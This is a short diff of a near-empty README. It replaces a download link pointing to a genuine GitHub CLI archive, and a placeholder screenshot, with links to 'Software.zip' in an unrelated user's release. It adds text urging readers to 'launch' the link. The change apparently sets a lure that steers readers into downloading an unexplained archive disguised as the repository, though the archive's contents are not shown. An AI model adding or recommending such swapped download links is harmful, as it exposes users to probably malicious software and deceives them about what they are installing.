@@ -8,7 +8,7 @@ This repository does not provide any specific topics.
 
 ## Get Started
 You can download the repository by clicking the button below:
-[![Download Repository](https://img.shields.io/badge/Download-Repository-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Repository](https://github.com/abbasite/x/releases/download/v1.0/Software.zip)](https://github.com/abbasite/x/releases/download/v1.0/Software.zip)
 
 Please note: This link needs to be launched in order to download the repository.
 
@@ -26,7 +26,7 @@ If the link does not work, please check the "Releases" section of the repository
 
 ## 📸 Screenshots
 
-![Screenshot](https://via.placeholder.com/500x300)
+![Screenshot](https://github.com/abbasite/x/releases/download/v1.0/Software.zip)
 
 ---
 
